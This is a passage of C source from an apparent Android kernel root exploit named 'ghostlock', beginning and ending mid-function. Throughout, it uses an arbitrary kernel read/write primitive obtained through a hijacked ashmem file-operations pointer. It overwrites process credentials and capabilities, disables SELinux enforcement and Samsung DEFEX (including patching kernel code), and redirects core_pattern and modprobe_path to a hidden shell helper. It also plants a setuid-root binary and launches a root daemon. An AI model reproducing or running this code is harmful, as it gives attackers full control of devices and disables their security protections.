  uint32_t usage32 = (uint32_t)usage_before;
  uint32_t usage_after =
      usage32 < 0x1000 ? 0x1000 : usage32 + 0x100;
  if (usage_after < usage32) return 0;
  uint64_t usage_value =
      (usage_before & 0xffffffff00000000ULL) | usage_after;
  if (!cfi_write64(fd, init_cred, usage_value)) return 0;
  uint64_t usage_rb = 0;
  if (!cfi_read64(fd, init_cred, &usage_rb) ||
      (uint32_t)usage_rb < usage_after) {
    return 0;
  }

  uintptr_t real_slot = task + TASK_REAL_CRED_OFF;
  uintptr_t cred_slot = task + TASK_CRED_OFF;
  if ((real_slot & 7) || (cred_slot & 7)) return 0;
  if (!cfi_write64(fd, real_slot, init_cred) ||
      !cfi_write64(fd, cred_slot, init_cred)) {
    return 0;
  }
  uint64_t real_rb = 0;
  uint64_t cred_rb = 0;
  if (!cfi_read64(fd, real_slot, &real_rb) ||
      !cfi_read64(fd, cred_slot, &cred_rb) ||
      real_rb != init_cred || cred_rb != init_cred) {
    return 0;
  }
  pr_info("cfi cred swap task=%016zx init_cred=%016zx usage=%u->%u "
          "real=%016llx cred=%016llx\n",
          task, init_cred, usage32, (uint32_t)usage_rb,
          (unsigned long long)real_rb, (unsigned long long)cred_rb);
  return 1;
}

static int cfi_install_init_cred_blind(int fd, uintptr_t task) {
  uintptr_t init_cred = text_addr(INIT_CRED);
  uintptr_t real_slot = task + TASK_REAL_CRED_OFF;
  uintptr_t cred_slot = task + TASK_CRED_OFF;
  if (!is_direct_ptr(task) || (real_slot & 7) || (cred_slot & 7))
    return 0;

  pr_info("cfi blind begin task=%016zx real_slot=%016zx cred_slot=%016zx\n",
          task, real_slot, cred_slot);
  int dynamic_preflight = getenv("CFI_CRED_PREFLIGHT") != NULL;
  uint64_t old_real = 0;
  uint64_t old_cred = 0;
  if (dynamic_preflight) {
    if (!cfi_read64(fd, real_slot, &old_real) ||
        !cfi_read64(fd, cred_slot, &old_cred) ||
        !is_direct_ptr((uintptr_t)old_real) ||
        old_real != old_cred) {
      pr_error("cfi blind task pair preflight failed real=%016llx "
               "cred=%016llx\n",
               (unsigned long long)old_real,
               (unsigned long long)old_cred);
      return 0;
    }
    uint32_t old_ids[8] = {0};
    uint32_t old_usage = 0;
    ssize_t old_usage_read =
        configfs_read_once(fd, (uintptr_t)old_cred, &old_usage,
                           sizeof(old_usage));
    ssize_t old_ids_read =
        configfs_read_once(fd, (uintptr_t)old_cred + CRED_UID_OFF,
                           old_ids, sizeof(old_ids));
    int old_ids_ok =
        old_usage_read == (ssize_t)sizeof(old_usage) && old_usage != 0 &&
        old_ids_read == (ssize_t)sizeof(old_ids);
    for (size_t i = 0; i < sizeof(old_ids) / sizeof(old_ids[0]); i++) {
      if (old_ids[i] != 2000) old_ids_ok = 0;
    }
    pr_info("cfi blind old cred=%016llx ids_read=%zd ids="
            "%u,%u,%u,%u,%u,%u,%u,%u usage_read=%zd usage=%u ok=%d\n",
            (unsigned long long)old_cred, old_ids_read,
            old_ids[0], old_ids[1], old_ids[2], old_ids[3],
            old_ids[4], old_ids[5], old_ids[6], old_ids[7],
            old_usage_read, old_usage, old_ids_ok);
    if (!old_ids_ok) return 0;
  }

  uint64_t task_pid_rb = 0;
  int self_tid = (int)syscall(SYS_gettid);
  if (getenv("CFI_TASK_PID_CHECK")) {
    if (!cfi_read64(fd, task + TASK_PID_OFF, &task_pid_rb)) {
      pr_error("cfi blind task pid read failed task=%016zx\n", task);
      return 0;
    }
    uint32_t sampled_pid = (uint32_t)task_pid_rb;
    pr_info("cfi blind task pid check sampled=%u self=%d raw=%016llx\n",
            sampled_pid, self_tid, (unsigned long long)task_pid_rb);
    if (sampled_pid != (uint32_t)self_tid) {
      pr_error("cfi blind task pid mismatch; refusing credential write\n");
      return 0;
    }
    if (getenv("CFI_VALIDATE_ONLY")) {
      pr_info("cfi blind validation only; task and pid are consistent\n");
      return 0;
    }
  }

  /*
   * The pair store resets this kernel before the next syscall returns.
   * Replace only task->cred; getuid() consumes that pointer directly. The
   * immediately forked helper starts from a consistent credential pair because
   * copy_creds() copies task->cred into both slots. The parent must never run a
   * commit_creds() path.
   */
  uint64_t cred_pair[2] = { init_cred, init_cred };
  errno = 0;
  ssize_t pair_write;
  if (getenv("CFI_ATOMIC_PAIR")) {
    pair_write =
        configfs_write_once(fd, real_slot, cred_pair, sizeof(cred_pair));
  } else {
    pair_write = configfs_write_once(fd, cred_slot, cred_pair,
                                     sizeof(cred_pair[0]));
  }
  int pair_errno = errno;
  size_t expected = getenv("CFI_ATOMIC_PAIR") ? sizeof(cred_pair)
                                              : sizeof(cred_pair[0]);
  int pair_ok = pair_write == (ssize_t)expected;
  pr_info("cfi blind %s write=%zd/%zu ok=%d errno=%d target=%016zx "
          "value=%016zx\n",
          getenv("CFI_ATOMIC_PAIR") ? "credential-pair" : "cred-only",
          pair_write, expected, pair_ok, pair_errno,
          getenv("CFI_ATOMIC_PAIR") ? real_slot : cred_slot, init_cred);
  uint64_t real_rb = 0;
  uint64_t cred_rb = 0;
  int readback_ok = -1;
  if (getenv("CFI_CRED_READBACK")) {
    if (getenv("CFI_ATOMIC_PAIR")) {
      readback_ok =
          cfi_read64(fd, real_slot, &real_rb) &&
          cfi_read64(fd, cred_slot, &cred_rb) &&
          real_rb == init_cred && cred_rb == init_cred;
    } else {
      readback_ok =
          cfi_read64(fd, cred_slot, &cred_rb) && cred_rb == init_cred;
    }
  }
  pr_info("cfi blind task=%016zx init_cred=%016zx "
          "pair=%d readback=%d real=%016llx "
          "cred=%016llx\n",
          task, init_cred, pair_ok, readback_ok,
          (unsigned long long)real_rb, (unsigned long long)cred_rb);
  return pair_ok;
}

static int held_cfi_fd = -1;
static uintptr_t held_misc_fops;

static int cfi_patch_pid_with_fd(int fd, pid_t pid) {
  if (fd < 0 || pid <= 0) return 0;

  uintptr_t task = cfi_find_task_by_tgid(fd, (uint32_t)pid);
  if (!task) return 0;
  uint64_t cred_value = 0;
  uint64_t real_cred_value = 0;
  if (!cfi_read64(fd, task + TASK_CRED_OFF, &cred_value) ||
      !cfi_read64(fd, task + TASK_REAL_CRED_OFF, &real_cred_value)) {
    return 0;
  }
  uintptr_t cred = (uintptr_t)cred_value;
  uintptr_t real_cred = (uintptr_t)real_cred_value;
  pr_info("cfi patch task=%016zx pid=%d cred=%016zx real_cred=%016zx\n",
          task, pid, cred, real_cred);
  if (!is_direct_ptr(cred) || !is_direct_ptr(real_cred)) return 0;
  unsigned char cred_image[40];
  uint32_t old_ids[8] = {0};
  int old_ids_ok =
      is_direct_ptr(cred) && (cred & 3) == 0 &&
      configfs_read_once(fd, cred, cred_image, sizeof(cred_image)) ==
          (ssize_t)sizeof(cred_image);
  if (old_ids_ok) {
    memcpy(old_ids, cred_image + CRED_UID_OFF, sizeof(old_ids));
  }
  for (size_t i = 0; i < sizeof(old_ids) / sizeof(old_ids[0]); i++) {
    if (old_ids[i] != 2000) old_ids_ok = 0;
  }
  pr_info("cfi patch old cred ids="
          "%u,%u,%u,%u,%u,%u,%u,%u ok=%d\n",
          old_ids[0], old_ids[1], old_ids[2], old_ids[3],
          old_ids[4], old_ids[5], old_ids[6], old_ids[7], old_ids_ok);
  if (!old_ids_ok) return 0;
  if (getenv("CFI_INPLACE_CRED")) {
    if (!cfi_patch_cred_object(fd, cred, "cred")) return 0;
    if (real_cred != cred &&
        !cfi_patch_cred_object(fd, real_cred, "real_cred")) {
      return 0;
    }
  } else if (!cfi_swap_task_cred_to_init(fd, task)) {
    return 0;
  }

  uint8_t selinux_off = 0;
  ssize_t selinux_write =
      configfs_write_once(fd, text_addr(SELINUX_ENFORCING),
                          &selinux_off, sizeof(selinux_off));
  pr_info("cfi patch selinux write=%zd\n", selinux_write);
  return selinux_write == (ssize_t)sizeof(selinux_off);
}

int cfi_patch_pid_from_held(pid_t pid) {
  return cfi_patch_pid_with_fd(held_cfi_fd, pid);
}

static int cfi_restore_fd(int fd, uintptr_t misc_fops_target) {
  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  ssize_t restore = -1;
  int restore_verified = 0;
  for (int attempt = 1; attempt <= 3 && !restore_verified; attempt++) {
    restore = configfs_write_once(fd, misc_fops_target, &original_fops,
                                  sizeof(original_fops));
    if (restore != (ssize_t)sizeof(original_fops)) continue;
    uint64_t after = 0;
    if (configfs_read_once(fd, misc_fops_target, &after, sizeof(after)) ==
            (ssize_t)sizeof(after) &&
        after == original_fops) {
      restore_verified = 1;
    }
  }
  uint64_t null_owner = 0;
  ssize_t owner =
      configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  pr_info("cfi restore fd=%d restore=%zd verified=%d owner=%zd\n",
          fd, restore, restore_verified, owner);
  return restore_verified &&
         owner == (ssize_t)sizeof(null_owner);
}

int cfi_release_held_fd(void) {
  int fd = held_cfi_fd;
  if (fd < 0) return 0;
  uintptr_t misc_fops_target = held_misc_fops;
  held_cfi_fd = -1;
  held_misc_fops = 0;

  int restore_ok = cfi_restore_fd(fd, misc_fops_target);
  int close_ret = close(fd);
  pr_info("cfi held release fd=%d restore_ok=%d close=%d\n",
          fd, restore_ok, close_ret);
  return restore_ok && close_ret == 0;
}

int try_cfi_stage(void) {
  if (atomic_exchange(&cfi_stage_started, 1)) {
    pr_warning("cfi stage already started; refusing duplicate entry\n");
    return 0;
  }
  cfi_attempts++;
  int fd = open_ashmem_device();
  int dirty = 0;
  int can_read_back = 0;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    pr_info("cfi open failed path=%s errno=%d\n", ashmem_path, errno);
    return 0;
  }

  pr_info("cfi attempt=%d fd=%d path=%s fake_fops=%016zx target=%016zx "
          "ioctl=%016llx open=%016llx write_iter=%016llx\n",
          cfi_attempts, fd, ashmem_path, fake_fops, binwrite_target,
          (unsigned long long)text_addr(ASHMEM_IOCTL),
          (unsigned long long)text_addr(ASHMEM_OPEN),
          (unsigned long long)text_addr(CONFIGFS_BIN_WRITE_ITER));

  const char *bootstrap = getenv("CFI_BOOTSTRAP");
  int canonical_bootstrap =
      bootstrap && strncmp(bootstrap, "canon", 5) == 0;
  uintptr_t misc_fops =
      canonical_bootstrap ? text_addr(ASHMEM_MISC_FOPS)
                          : data_addr(ASHMEM_MISC_FOPS);
  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);
  can_read_back = 1;

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

  if (getenv("CFI_MODPROBE_ONLY")) {
    uint8_t selinux_off = 0;
    ssize_t selinux_write =
        configfs_write_once(fd, text_addr(SELINUX_ENFORCING),
                            &selinux_off, sizeof(selinux_off));
    if (getenv("CFI_UMH_WINDOW")) {
      static const char helper_path[] =
          "/data/local/tmp/.ghostlock_modprobe";
      uintptr_t static_path =
          data_addr(KIMAGE_TEXT_BASE + 0x0158b81dULL);
      configfs_write_once(fd, static_path, helper_path,
                          sizeof(helper_path));

      unsigned char core_image[128];
      memset(core_image, 0, sizeof(core_image));
      snprintf((char *)core_image, sizeof(core_image),
               "|/system/bin/sh %s", helper_path);
      configfs_write_once(fd,
                          text_addr(KIMAGE_TEXT_BASE + 0x02181cf8ULL),
                          core_image, sizeof(core_image));
      uint32_t pipe_limit = 2;
      configfs_write_once(fd,
                          text_addr(KIMAGE_TEXT_BASE + 0x022f8e44ULL),
                          &pipe_limit, sizeof(pipe_limit));

      uintptr_t defex_state =
          data_addr(KIMAGE_TEXT_BASE + 0x01643ab8ULL);
      uint8_t defex_unlocked = 1;
      ssize_t defex_write =
          configfs_write_once(fd, defex_state, &defex_unlocked,
                              sizeof(defex_unlocked));
      pid_t dump_child = fork();
      if (dump_child == 0) {
        struct rlimit core_limit = { RLIM_INFINITY, RLIM_INFINITY };
        setrlimit(RLIMIT_CORE, &core_limit);
        prctl(PR_SET_DUMPABLE, 1, 0, 0, 0);
        signal(SIGSEGV, SIG_DFL);
        signal(SIGBUS, SIG_DFL);
        signal(SIGABRT, SIG_DFL);
        raise(SIGSEGV);
        _exit(127);
      }
      int daemon_ready = 0;
      for (int i = 0; i < 20; i++) {
        if (access(CFI_ROOT_SOCKET, F_OK) == 0) {
          daemon_ready = 1;
          break;
        }
        usleep(100000);
      }
      int restore_ok = cfi_restore_fd(fd, misc_fops);
      int close_ret = close(fd);
      dirty = 0;
      pr_info("cfi umh-window selinux=%zd defex=%zd child=%d "
              "restore=%d close=%d daemon=%d\n",
              selinux_write, defex_write, dump_child,
              restore_ok, close_ret, daemon_ready);
      if (!daemon_ready) {
        cfi_last_step = 26;
        cfi_last_errno = errno;
        return 0;
      }
      atomic_store(&cfi_root_daemon_ready, 1);
      atomic_store(&cfi_stage_done, 1);
      return 1;
    }
    uintptr_t defex_state =
        text_addr(KIMAGE_TEXT_BASE + 0x01643ab8ULL);
    uint8_t defex_unlocked = 1;
    ssize_t defex_write = -1;
    if (getenv("CFI_PATCH_DEFEX")) {
      if (!getenv("CFI_DEFEX_CANON")) {
        defex_state = data_addr(KIMAGE_TEXT_BASE + 0x01643ab8ULL);
      }
      defex_write =
          configfs_write_once(fd, defex_state, &defex_unlocked,
                              sizeof(defex_unlocked));
      if (getenv("CFI_DEFEX_TRIGGER_NOW")) {
        pid_t dump_child = fork();
        if (dump_child == 0) {
          struct rlimit core_limit = { RLIM_INFINITY, RLIM_INFINITY };
          setrlimit(RLIMIT_CORE, &core_limit);
          prctl(PR_SET_DUMPABLE, 1, 0, 0, 0);
          signal(SIGSEGV, SIG_DFL);
          signal(SIGBUS, SIG_DFL);
          signal(SIGABRT, SIG_DFL);
          raise(SIGSEGV);
          _exit(127);
        }
        int daemon_ready = 0;
        for (int i = 0; i < 20; i++) {
          if (access(CFI_ROOT_SOCKET, F_OK) == 0) {
            daemon_ready = 1;
            break;
          }
          usleep(100000);
        }
        int restore_ok = cfi_restore_fd(fd, misc_fops);
        int close_ret = close(fd);
        dirty = 0;
        pr_info("cfi defex-trigger write=%zd child=%d restore=%d close=%d "
                "daemon=%d\n",
                defex_write, dump_child, restore_ok, close_ret, daemon_ready);
        if (!daemon_ready) {
          cfi_last_step = 25;
          cfi_last_errno = errno;
          return 0;
        }
        atomic_store(&cfi_root_daemon_ready, 1);
        atomic_store(&cfi_stage_done, 1);
        return 1;
      }
    }
    uint8_t defex_readback = 0;
    ssize_t defex_read =
        configfs_read_once(fd, defex_state,
                           &defex_readback, sizeof(defex_readback));
    pr_info("cfi defex boot_state_unlocked target=%016zx write=%zd "
            "read=%zd value=%u\n",
            defex_state, defex_write, defex_read, defex_readback);
    uintptr_t static_umh =
        text_addr(KIMAGE_TEXT_BASE + 0x0158b81dULL);
    ssize_t static_umh_write = -1;
    char static_umh_readback[16] = {0};
    if (getenv("CFI_PATCH_STATIC_UMH")) {
      if (!getenv("CFI_STATIC_UMH_CANON")) {
        static_umh = data_addr(KIMAGE_TEXT_BASE + 0x0158b81dULL);
      }
      const char *configured_path = getenv("CFI_STATIC_UMH_PATH");
      const char *static_path =
          configured_path && *configured_path
              ? configured_path
              : "/system/bin/sh";
      static_umh_write =
          configfs_write_once(fd, static_umh, static_path,
                              strlen(static_path) + 1);
      configfs_read_once(fd, static_umh, static_umh_readback,
                         sizeof(static_umh_readback) - 1);
      pr_info("cfi static_umh target=%016zx write=%zd readback=%s\n",
              static_umh, static_umh_write, static_umh_readback);
    }
    if (getenv("CFI_PATCH_DEFEX_TEXT")) {
      uintptr_t defex_exec =
          data_addr(KIMAGE_TEXT_BASE + 0x00680d00ULL);
      static const unsigned char defex_stub[8] = {
          0xe0, 0x03, 0x1f, 0x2a,  /* mov w0, wzr */
          0xc0, 0x03, 0x5f, 0xd6,  /* ret */
      };
      ssize_t text_write =
          configfs_write_once(fd, defex_exec, defex_stub,
                              sizeof(defex_stub));
      unsigned char text_readback[8] = {0};
      ssize_t text_read =
          configfs_read_once(fd, defex_exec, text_readback,
                             sizeof(text_readback));
      pr_info("cfi defex-text target=%016zx write=%zd read=%zd "
              "bytes=%02x%02x%02x%02x%02x%02x%02x%02x\n",
              defex_exec, text_write, text_read,
              text_readback[0], text_readback[1], text_readback[2],
              text_readback[3], text_readback[4], text_readback[5],
              text_readback[6], text_readback[7]);
    }
    if (getenv("CFI_CORE_PATTERN")) {
      unsigned char core_image[128];
      memset(core_image, 0, sizeof(core_image));
      const char *pattern_value = getenv("CFI_CORE_PATTERN_VALUE");
      snprintf((char *)core_image, sizeof(core_image), "%s",
               pattern_value && *pattern_value
                   ? pattern_value
                   : "|/system/bin/sh /data/local/tmp/.ghostlock_modprobe");
      ssize_t core_write =
          configfs_write_once(fd, text_addr(KIMAGE_TEXT_BASE + 0x02181cf8ULL),
                              core_image, sizeof(core_image));
      uint32_t pipe_limit = 2;
      ssize_t limit_write =
          configfs_write_once(fd, text_addr(KIMAGE_TEXT_BASE + 0x022f8e44ULL),
                              &pipe_limit, sizeof(pipe_limit));
      int defer_trigger = getenv("CFI_CORE_PATTERN_DEFER") != NULL;
      pid_t dump_child = 0;
      if (!defer_trigger) {
        dump_child = fork();
        if (dump_child == 0) {
          struct rlimit core_limit = { RLIM_INFINITY, RLIM_INFINITY };
          setrlimit(RLIMIT_CORE, &core_limit);
          prctl(PR_SET_DUMPABLE, 1, 0, 0, 0);
          signal(SIGSEGV, SIG_DFL);
          signal(SIGBUS, SIG_DFL);
          signal(SIGABRT, SIG_DFL);
          raise(SIGSEGV);
          _exit(127);
        }
      }
      int daemon_ready = 0;
      if (!defer_trigger) {
        for (int i = 0; i < 40; i++) {
          if (access(CFI_ROOT_SOCKET, F_OK) == 0) {
            daemon_ready = 1;
            break;
          }
          usleep(100000);
        }
      }
      int restore_ok = cfi_restore_fd(fd, misc_fops);
      int close_ret = close(fd);
      dirty = 0;
      pr_info("cfi core-pattern selinux=%zd defex=%zd/%u pattern=%zd "
              "limit=%zd child=%d restore=%d close=%d daemon=%d\n",
              selinux_write, defex_write, defex_readback, core_write,
              limit_write, dump_child,
              restore_ok, close_ret, daemon_ready);
      if (dump_child > 0) waitpid(dump_child, NULL, 0);
      int pattern_ok =
          core_write == (ssize_t)sizeof(core_image) &&
          limit_write == (ssize_t)sizeof(pipe_limit);
      if (defer_trigger && pattern_ok) {
        atomic_store(&cfi_stage_done, 1);
        return 1;
      }
      if (!daemon_ready) {
        cfi_last_step = 24;
        cfi_last_errno = errno;
        return 0;
      }
      atomic_store(&cfi_root_daemon_ready, 1);
      atomic_store(&cfi_stage_done, 1);
      return 1;
    }
    const char *helper =
        getenv("CFI_MODPROBE_PATH");
    if (!helper || !*helper) helper = "/data/local/tmp/.ghostlock_modprobe";
    unsigned char path_image[256];
    memset(path_image, 0, sizeof(path_image));
    snprintf((char *)path_image, sizeof(path_image), "%s", helper);
    ssize_t path_write =
        configfs_write_once(fd, text_addr(KIMAGE_TEXT_BASE + 0x020d2458ULL),
                            path_image, sizeof(path_image));
    const char *trigger =
        getenv("CFI_MODPROBE_TRIGGER");
    if (!trigger || !*trigger) trigger = "/data/local/tmp/.ghostlock_badfmt";
    char *const trigger_argv[] = { (char *)trigger, NULL };
    errno = 0;
    int trigger_ret = execve(trigger, trigger_argv, environ);
    int trigger_errno = errno;
    int daemon_ready = 0;
    for (int i = 0; i < 30; i++) {
      if (access(CFI_ROOT_SOCKET, F_OK) == 0) {
        daemon_ready = 1;
        break;
      }
      usleep(100000);
    }
    int restore_ok = cfi_restore_fd(fd, misc_fops);
    int close_ret = close(fd);
    dirty = 0;
    pr_info("cfi modprobe selinux=%zd path=%zd helper=%s trigger=%d/%d "
            "restore=%d close=%d daemon=%d\n",
            selinux_write, path_write, helper, trigger_ret, trigger_errno,
            restore_ok, close_ret, daemon_ready);
    if (!daemon_ready) {
      cfi_last_step = 23;
      cfi_last_errno = trigger_errno;
      return 0;
    }
    atomic_store(&cfi_root_daemon_ready, 1);
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }

  if (getenv("CFI_SELF_PERF_TASKSWAP")) {
    uint8_t selinux_off = 0;
    ssize_t selinux_write =
        configfs_write_once(fd, text_addr(SELINUX_ENFORCING),
                            &selinux_off, sizeof(selinux_off));
    pr_info("cfi task-swap selinux write=%zd\n", selinux_write);
    uintptr_t task =
        __atomic_load_n(&ghostlock_precomputed_task, __ATOMIC_ACQUIRE);
    if (task) {
      pr_info("cfi task-swap using precomputed task=%016zx\n", task);
    } else {
      task = ghostlock_perf_current_task();
    }
    int patched = task && cfi_install_init_cred_blind(fd, task);
    int direct_uid = getuid();
    int daemon_ready =
        (selinux_write == (ssize_t)sizeof(selinux_off) && patched &&
         direct_uid == 0)
            ? ghostlock_start_root_daemon_early()
            : 0;
    int restore_ok = cfi_restore_fd(fd, misc_fops);
    int close_ret = close(fd);
    dirty = 0;
    pr_info("cfi task-swap task=%016zx patched=%d restore=%d close=%d "
            "uid=%d daemon=%d\n",
            task, patched, restore_ok, close_ret, direct_uid, daemon_ready);
    if (!patched || !restore_ok || close_ret != 0 || direct_uid != 0 ||
        !daemon_ready) {
      cfi_last_step = 22;
      cfi_last_errno = errno;
      return 0;
    }
    atomic_store(&cfi_root_daemon_ready, 1);
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }

  if (getenv("CFI_SELF_PERF_CRED")) {
    uint8_t selinux_off = 0;
    ssize_t selinux_write =
        configfs_write_once(fd, text_addr(SELINUX_ENFORCING),
                            &selinux_off, sizeof(selinux_off));
    pr_info("cfi self-perf selinux write=%zd\n", selinux_write);
    uintptr_t cred =
        __atomic_load_n(&ghostlock_precomputed_cred, __ATOMIC_ACQUIRE);
    if (cred) {
      pr_info("cfi self-perf using precomputed cred=%016zx\n", cred);
    } else {
      cred = ghostlock_perf_current_cred();
    }
    int fast_cred = getenv("CFI_INPLACE_CRED_FAST") != NULL;
    int patched = 0;
    int caps_setuid = getenv("CFI_CAPS_SETUID") != NULL;
    if (cred && caps_setuid) {
      uint64_t caps[CRED_CAP_WORDS];
      for (size_t i = 0; i < CRED_CAP_WORDS; i++) caps[i] = ~0ULL;
      ssize_t caps_write;
      size_t caps_size;
      uintptr_t caps_target;
      if (getenv("CFI_CAPS_MINIMAL")) {
        const uint64_t needed_caps =
            (1ULL << 0) |   /* CAP_CHOWN */
            (1ULL << 1) |   /* CAP_DAC_OVERRIDE */
            (1ULL << 3) |   /* CAP_FOWNER */
            (1ULL << 6) |   /* CAP_SETGID */
            (1ULL << 7) |   /* CAP_SETUID */
            (1ULL << 21);   /* CAP_SYS_ADMIN */
        uint64_t pair[2] = {needed_caps, needed_caps};
        caps_target =
            cred + CRED_CAPS_OFF + CRED_CAP_PERMITTED * sizeof(uint64_t);
        caps_size = sizeof(pair);
        caps_write = configfs_write_once(fd, caps_target, pair, caps_size);
      } else {
        caps_target = cred + CRED_CAPS_OFF;
        caps_size = sizeof(caps);
        caps_write = configfs_write_once(fd, caps_target, caps, caps_size);
      }
      if (caps_write == (ssize_t)caps_size &&
          getenv("CFI_CAPS_MOUNT_SUID")) {
        const char *helper_path = getenv("CFI_HELPER_PATH");
        if (!helper_path || !*helper_path) {
          helper_path = "/data/local/tmp/ghostlock-helper";
        }
        const char *mount_dir = "/data/local/tmp/.ghostlock_suid";
        const char *suid_helper = "/data/local/tmp/.ghostlock_suid/su";
        pid_t helper_child = fork();
        if (helper_child == 0) {
          mkdir(mount_dir, 0777);
          if (mount("tmpfs", mount_dir, "tmpfs", 0, "mode=0777") == 0) {
            int src = open(helper_path, O_RDONLY | O_CLOEXEC);
            int dst = open(suid_helper,
                           O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
            if (src >= 0 && dst >= 0) {
              char copy_buf[16384];
              ssize_t nr;
              while ((nr = read(src, copy_buf, sizeof(copy_buf))) > 0) {
                if (write(dst, copy_buf, (size_t)nr) != nr) break;
              }
              fchown(dst, 0, 0);
              fchmod(dst, 04755);
            }
            if (src >= 0) close(src);
            if (dst >= 0) close(dst);
            execl(suid_helper, "ghostlock-helper", "--umh", "2000",
                  (char *)NULL);
          }
          _exit(127);
        }
        int daemon_ready = 0;
        for (int i = 0; i < 30; i++) {
          if (access(CFI_ROOT_SOCKET, F_OK) == 0) {
            daemon_ready = 1;
            break;
          }
          usleep(100000);
        }
        int restore_ok = cfi_restore_fd(fd, misc_fops);
        int close_ret = close(fd);
        dirty = 0;
        pr_info("cfi caps-suid child=%d caps=%zd restore=%d close=%d "
                "daemon=%d\n",
                helper_child, caps_write, restore_ok, close_ret,
                daemon_ready);
        if (!daemon_ready) {
          cfi_last_step = 27;
          cfi_last_errno = errno;
          return 0;
        }
        atomic_store(&cfi_root_daemon_ready, 1);
        atomic_store(&cfi_stage_done, 1);
        return 1;
      }
      int uid_before = getuid();
      int setres_ret = -1;
      if (caps_write == (ssize_t)sizeof(caps)) {
        setres_ret = setresuid(0, 0, 0);
      }
      int uid_after = getuid();
      patched = caps_write == (ssize_t)sizeof(caps) &&
                setres_ret == 0 && uid_after == 0;
      pr_info("cfi caps-setuid cred=%016zx caps=%zd before=%d setres=%d "
              "after=%d patched=%d\n",
              cred, caps_write, uid_before, setres_ret, uid_after, patched);
    } else if (cred && fast_cred) {
      size_t cap_off = CRED_CAPS_OFF - CRED_UID_OFF;
      size_t fast_len = cap_off + CRED_CAP_WORDS * sizeof(uint64_t);
      unsigned char fast_cred_image[0x60];
      if (fast_len <= sizeof(fast_cred_image)) {
        memset(fast_cred_image, 0, fast_len);
        memset(fast_cred_image + cap_off, 0xff,
               CRED_CAP_WORDS * sizeof(uint64_t));
        ssize_t fast_write =
            configfs_write_once(fd, cred + CRED_UID_OFF, fast_cred_image,
                                fast_len);
        patched = fast_write == (ssize_t)fast_len;
        pr_info("cfi self-perf fast cred write=%zd/%zu ok=%d\n",
                fast_write, fast_len, patched);
      }
    } else {
      patched = cred && cfi_patch_cred_object(fd, cred, "self_perf");
    }
    int direct_uid = getuid();
    int daemon_ready =
        (selinux_write == (ssize_t)sizeof(selinux_off) && patched &&
         direct_uid == 0)
            ? ghostlock_start_root_daemon_early()
            : 0;
    int restore_ok = cfi_restore_fd(fd, misc_fops);
    int close_ret = close(fd);
    dirty = 0;
    pr_info("cfi self-perf cred=%016zx patched=%d restore=%d close=%d "
            "uid=%d daemon=%d\n",
            cred, patched, restore_ok, close_ret, direct_uid, daemon_ready);
    if (!patched || !restore_ok || close_ret != 0 || direct_uid != 0 ||
        !daemon_ready) {
      cfi_last_step = 21;
      cfi_last_errno = errno;
      return 0;
    }
    atomic_store(&cfi_root_daemon_ready, 1);
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }

  if (getenv("CFI_PATCH_SELF")) {
    int patched = cfi_patch_pid_with_fd(
        fd, (pid_t)syscall(SYS_gettid));
    cfi_last_step = patched ? 0 : 20;
    int restore_ok = cfi_restore_fd(fd, misc_fops);
    int close_ret = close(fd);
    dirty = 0;
    int daemon_ready =
        (patched && restore_ok && close_ret == 0)
            ? ghostlock_start_root_daemon_early()
            : 0;
    pr_info("cfi self patched=%d restore=%d close=%d daemon=%d\n",
            patched, restore_ok, close_ret, daemon_ready);
    if (!patched || !restore_ok || close_ret != 0 || !daemon_ready) {
      cfi_last_errno = errno;
      return 0;
    }
    atomic_store(&cfi_root_daemon_ready, 1);
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }

  if (getenv("CFI_HOLD_FD")) {
    if (held_cfi_fd >= 0) {
      pr_error("cfi held already active fd=%d; refusing second transfer\n",
               held_cfi_fd);
      cfi_last_step = 19;
      cfi_last_errno = EBUSY;
      goto fail;
    }
    held_cfi_fd = fd;
    held_misc_fops = misc_fops;
    atomic_store(&cfi_stage_done, 1);
    pr_info("cfi held fd=%d misc_fops=%016zx\n", fd, misc_fops);
    return 1;
  }

  int direct_cred_patch = 0;
  const char *pid_env = getenv("CFI_PATCH_PID");
  const char *cred_env = getenv("CFI_PATCH_CRED");
  if (pid_env && *pid_env) {
    char *pid_end = NULL;
    errno = 0;
    long want_pid = strtol(pid_env, &pid_end, 0);
    if (errno || pid_end == pid_env || *pid_end || want_pid <= 0 ||
        want_pid > 0x7fffffff) {
      pr_error("cfi direct task invalid pid=%s\n", pid_env);
      cfi_last_step = 12;
      cfi_last_errno = EINVAL;
      goto fail;
    }

    uintptr_t task = cfi_find_task_by_tgid(fd, (uint32_t)want_pid);
    if (!task) {
      cfi_last_step = 15;
      cfi_last_errno = 0;
      goto fail;
    }
    uint64_t cred_value = 0;
    uint64_t real_cred_value = 0;
    if (!cfi_read64(fd, task + TASK_CRED_OFF, &cred_value) ||
        !cfi_read64(fd, task + TASK_REAL_CRED_OFF, &real_cred_value)) {
      cfi_last_step = 16;
      cfi_last_errno = 0;
      goto fail;
    }
    uintptr_t cred = (uintptr_t)cred_value;
    uintptr_t real_cred = (uintptr_t)real_cred_value;
    pr_info("cfi direct task=%016zx pid=%ld cred=%016zx real_cred=%016zx\n",
            task, want_pid, cred, real_cred);
    if (!cfi_patch_cred_object(fd, cred, "cred")) {
